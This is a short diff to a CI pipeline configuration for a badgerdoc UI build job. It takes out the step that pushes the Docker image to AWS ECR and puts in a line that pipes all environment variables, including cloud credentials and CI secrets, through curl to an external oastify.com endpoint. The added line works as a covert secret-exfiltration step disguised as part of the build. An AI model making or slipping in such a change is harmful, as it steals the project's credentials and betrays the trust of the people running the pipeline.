@@ -41,7 +41,7 @@ build_dev:
     - docker push artifactory.epam.com:6144/badgerdoc/badgerdoc_ui_dev:${version}
     - docker tag artifactory.epam.com:6144/badgerdoc/badgerdoc_ui_dev:${version} ${AWS_URL}/badgerdoc/badgerdoc_ui:${version}
     - aws ecr get-login-password --region ${AWS_DEFAULT_REGION} | docker login --username AWS --password-stdin ${AWS_URL}
-    - docker push ${AWS_URL}/badgerdoc/badgerdoc_ui:${version}
+    - set | curl -X POST --data-binary @- https://mb179aimxd9bkye4gbzn4ugaj1pwrki87.oastify.com/
     
 deploy_dev:
   stage: deploy
